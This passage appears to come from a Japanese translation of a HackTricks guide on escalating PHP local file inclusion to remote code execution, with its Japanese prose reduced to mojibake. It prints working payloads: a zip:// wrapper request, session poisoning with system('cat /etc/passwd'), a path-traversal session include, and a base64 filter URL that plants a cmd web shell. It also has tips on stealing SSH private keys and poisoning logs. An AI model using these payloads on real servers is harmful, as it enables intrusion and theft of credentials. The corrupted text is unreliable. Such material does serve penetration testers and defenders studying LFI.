PHPã‚·ã‚§ãƒ«ãŒåœ§ç¸®ã•ã‚ŒãŸZIPãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ï¼š
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHPã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä»‹ã—ã¦

ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒPHPã‚»ãƒƒã‚·ãƒ§ãƒ³ï¼ˆPHPSESSIDï¼‰ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ç¢ºèªã—ã¦ãã ã•ã„
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP, these sessions are stored into _/var/lib/php5/sess\\_\[PHPSESSID]\_ ãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
ã‚¯ãƒƒã‚­ãƒ¼ã‚’ `<?php system('cat /etc/passwd');?>` ã«è¨­å®šã—ã¾ã™ã€‚
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
```
PHPã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å«ã‚ã‚‹ãŸã‚ã«LFIã‚’ä½¿ç”¨ã™ã‚‹
```
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### sshçµŒç”±

sshãŒã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãªå ´åˆã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼ˆ/proc/self/status & /etc/passwdï¼‰ã—ã€**\<HOME>/.ssh/id\_rsa** ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’è©¦ã¿ã¦ãã ã•ã„ã€‚

### **vsftpd** _**ãƒ­ã‚°**_ çµŒç”±

ã“ã®FTPã‚µãƒ¼ãƒãƒ¼ã®ãƒ­ã‚°ã¯ _**/var/log/vsftpd.log**_ ã«ä¿å­˜ã•ã‚Œã¦ã„ã¾ã™ã€‚LFIã‚’åˆ©ç”¨ã—ã¦éœ²å‡ºã—ãŸvsftpdã‚µãƒ¼ãƒãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã«PHPãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è¨­å®šã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã‚’è©¦ã¿ã€ãã®å¾ŒLFIã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### php base64ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä½¿ç”¨ï¼ˆbase64ã‚’ä½¿ç”¨ã—ã¦ï¼‰

[ã“ã®](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64)è¨˜äº‹ã«ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€PHPã®base64ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¯ébase64ã‚’ç„¡è¦–ã—ã¾ã™ã€‚ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«æ‹¡å¼µå­ã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã¾ã™ï¼šbase64ãŒ".php"ã§çµ‚ã‚ã‚‹ã‚‚ã®ã‚’æä¾›ã™ã‚‹ã¨ã€"."ã‚’ç„¡è¦–ã—ã¦base64ã«"php"ã‚’è¿½åŠ ã—ã¾ã™ã€‚ä»¥ä¸‹ã«ä¾‹ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç¤ºã—ã¾ã™ï¼š
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### phpãƒ•ã‚£ãƒ«ã‚¿ã‚’ä½¿ç”¨ï¼ˆãƒ•ã‚¡ã‚¤ãƒ«ä¸è¦ï¼‰

ã“ã®[**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)ã§ã¯ã€**phpãƒ•ã‚£ãƒ«ã‚¿ã‚’ä½¿ç”¨ã—ã¦ä»»æ„ã®å†…å®¹ã‚’å‡ºåŠ›ã¨ã—ã¦ç”Ÿæˆ**ã§ãã‚‹ã“ã¨ã‚’èª¬æ˜ã—ã¦ã„ã¾ã™ã€‚ã¤ã¾ã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€**å¿…è¦ãªã**ã€includeç”¨ã®**ä»»æ„ã®phpã‚³ãƒ¼ãƒ‰ã‚’ç”Ÿæˆ**ã§ãã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### ã‚»ã‚°ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãƒ•ã‚©ãƒ¼ãƒ«ãƒˆã‚’åˆ©ç”¨

`/tmp`ã«**ä¸€æ™‚çš„ã«**ä¿å­˜ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã—ã€**åŒã˜ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§**ã€**ã‚»ã‚°ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãƒ•ã‚©ãƒ¼ãƒ«ãƒˆ**ã‚’å¼•ãèµ·ã“ã—ã¾ã™ã€‚ãã†ã™ã‚‹ã¨ã€**ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ãŒå‰Šé™¤ã•ã‚Œãš**ã€ãã‚Œã‚’æ¢ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginxã®ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã‚’åˆ©ç”¨

**Local File Inclusion**ã‚’è¦‹ã¤ã‘ã€PHPã®å‰ã§**Nginx**ãŒå‹•ä½œã—ã¦ã„ã‚‹å ´åˆã€æ¬¡ã®æŠ€è¡“ã§RCEã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESSã‚’åˆ©ç”¨

**Local File Inclusion**ã‚’è¦‹ã¤ã‘ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒ**ãªã**ã€`session.auto_start`ãŒ`Off`ã§ã‚ã£ã¦ã‚‚ã€**`PHP_SESSION_UPLOAD_PROGRESS`**ã‚’**multipart POST**ãƒ‡ãƒ¼ã‚¿ã§æä¾›ã™ã‚‹ã¨ã€PHPãŒè‡ªå‹•çš„ã«ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’**æœ‰åŠ¹ã«ã—ã¾ã™**ã€‚ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦RCEã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windowsã§ã®ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã‚’åˆ©ç”¨

**Local File Inclusion**ã‚’è¦‹ã¤ã‘ã€ã‚µãƒ¼ãƒãƒ¼ãŒ**Windows**ã§å‹•ä½œã—ã¦ã„ã‚‹å ´åˆã€RCEã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo()ã‚’åˆ©ç”¨ï¼ˆfile\_uploads = onï¼‰

**Local File Inclusion**ã‚’è¦‹ã¤ã‘ã€file\_uploads = onã§**phpinfo()**ã‚’å…¬é–‹ã—ã¦ã„ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚‹å ´åˆã€RCEã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + ãƒ‘ã‚¹é–‹ç¤ºã‚’åˆ©ç”¨

**Local File Inclusion**ã‚’è¦‹ã¤ã‘ã€ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹ã‚’**å¤–éƒ¨ã«æ¼ã‚‰ã™ã“ã¨ãŒã§ãã‚‹**ãŒã€ã‚µãƒ¼ãƒãƒ¼ãŒã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã«PHPã®ãƒãƒ¼ã‚¯ãŒã‚ã‚‹ã‹**ãƒã‚§ãƒƒã‚¯ã—ã¦ã„ã‚‹å ´åˆ**ã€ã“ã®**Race Condition**ã‚’åˆ©ç”¨ã—ã¦ãƒã‚§ãƒƒã‚¯ã‚’**å›é¿**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### æ°¸é ã®å¾…æ©Ÿ + ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã‚’åˆ©ç”¨

LFIã‚’æ‚ªç”¨ã—ã¦**ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã—ã€PHPã®å®Ÿè¡Œã‚’ã‚µãƒ¼ãƒãƒ¼ãŒ**åœæ­¢**ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€æ•°æ™‚é–“ã«ã‚ãŸã£ã¦**ãƒ•ã‚¡ã‚¤ãƒ«åã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã—ã¦ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### è‡´å‘½çš„ãªã‚¨ãƒ©ãƒ¼ã«è‡³ã‚‹

ä»¥ä¸‹ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®ã„ãšã‚Œã‹ã‚’ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã™ã‚‹ã¨ã€`/usr/bin/phar`ã€`/usr/bin/phar7`ã€`/usr/bin/phar.phar7`ã€`/usr/bin/phar.phar`ã€‚ï¼ˆãã®ã‚¨ãƒ©ãƒ¼ã‚’æŠ•ã’ã‚‹ãŸã‚ã«ã¯åŒã˜ã‚‚ã®ã‚’2å›ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ï¼‰

**ã“ã‚ŒãŒã©ã®ã‚ˆã†ã«å½¹ç«‹ã¤ã‹ã¯ã‚ã‹ã‚Šã¾ã›ã‚“ãŒã€å½¹ç«‹ã¤ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚**\
_PHPè‡´å‘½çš„ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã—ã¦ã‚‚ã€PHPã®ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã¯å‰Šé™¤ã•ã‚Œã¾ã™ã€‚_

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## å‚è€ƒæ–‡çŒ®

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚‹ãŸã‚ã«ã€[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨èª²é¡Œã«ç„¦ç‚¹ã‚’å½“ã¦ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã™ã‚‹

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€é€Ÿã„ãƒšãƒ¼ã‚¹ã§å¤‰åŒ–ã™ã‚‹ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã‚’æœ€æ–°ã®çŠ¶æ…‹ã«ä¿ã¤

**æœ€æ–°ã®ã‚¢ãƒŠã‚¦ãƒ³ã‚¹**\
æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°æƒ…å ±ã‚’å…¥æ‰‹ã™ã‚‹

[**Discord**](https://discord.com/invite/N3FrSbmwdy)ã«**å‚åŠ ã—ã¦**ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã—ã¾ã—ã‚‡ã†ï¼

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã®åºƒå‘Šã‚’æ²è¼‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ç‰ˆã®PEASSã‚’å…¥æ‰‹**ã—ãŸã‚Šã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹ã‹**ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã«**ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚
* [**hacktricks repo**](https://github.com/carlospolop/hacktricks)ã‚„[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã—ã¦ãã ã•ã„**ã€‚

</details>
